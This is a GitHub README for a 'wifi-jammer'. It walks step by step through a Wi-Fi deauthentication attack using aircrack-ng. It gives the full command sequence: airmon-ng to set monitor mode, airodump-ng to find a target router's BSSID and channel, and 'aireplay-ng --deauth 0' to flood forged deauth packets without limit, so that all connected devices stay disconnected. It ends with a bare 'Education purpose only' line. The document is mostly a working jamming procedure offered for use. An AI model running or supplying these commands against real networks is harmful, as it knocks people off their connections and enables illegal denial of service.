# wifi-jammer
wifi jammer using aircrack-ng without any external wifi adapters.
# What is deauth attack
A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to jam. These packets include fake "sender" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect.
# Getting started 
Install [aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) on your machine and make sure your wifi card supports monitor mode (your in-build wifi card is enough if it supports monitor mode)
# Jamming
### Monitor Mode
1. type `iwconfig` in your terminal

   ![1](https://github.com/mtm-x/wifi-jammer/assets/88881685/8e6b01cb-34cc-4fad-babe-42c7d38db355)

In this instance, my wireless card is called wlan0.

2. Now run 

```
sudo airmon-ng start wlan0
```
where wlan0 is your network card. This will put your card into monitor mode which allows the card to monitor all traffic on the network.


![2](https://github.com/mtm-x/wifi-jammer/assets/88881685/02ea0b7a-0e36-4273-a1af-f2b22535df48)

as you can see my wifi card is now in monitor mode


3. You will need to run `iwconfig` again because after switching to monitor mode it will change your network card name. In most cases it changes it to mon0 but in mine it’s changed to wlan0mon.

   ![3](https://github.com/mtm-x/wifi-jammer/assets/88881685/db4ac485-2cd4-4b18-92d8-ee8afd7a4408)

4. Now run


   
```
sudo airodump-ng wlan0mon
```


![4](https://github.com/mtm-x/wifi-jammer/assets/88881685/77d64c1c-b02f-489d-84f6-c23a376558d9)

This is every single router in range. Now we just gonna deauth my router named victim.

We want to take note of 2 things here:

    The BSSID (mac address) of the router
    The Channel(CH) of the router


In my case the channel is 4 and copy the corresponding bssid 


5. Now run the following command


```
sudo airodump-ng wlan0mon --bssid [routers BSSID here] -c [routers channel here]
```

-c for channel . Press `ctrl+c` to stop

![5](https://github.com/mtm-x/wifi-jammer/assets/88881685/8df5a9ea-d57e-4339-829f-383b5fe1d267)

now it shows like this

6. now run

```
sudo aireplay-ng --deauth 0 -a [ROUTERS BSSID HERE] wlan0mon
```

The 0 represents an infinite amount of deauth attacks. If you wanted to only run 5 deauth attacks you’ll change this to 5.


![6](https://github.com/mtm-x/wifi-jammer/assets/88881685/46124812-fa05-402b-b9c1-0491933547ae)


now all the devices connected to the router 'victim' will be disconnected . The connected devices try to reconnect to the router 'victim' but again it will be disconnected . Press `ctrl+c` to stop


## Managed Mode

After the attack put your wifi card in managed mode 

1. Run

```
sudo airmon-ng stop wlan0mon  
```

That's it 

Education purpose only


   






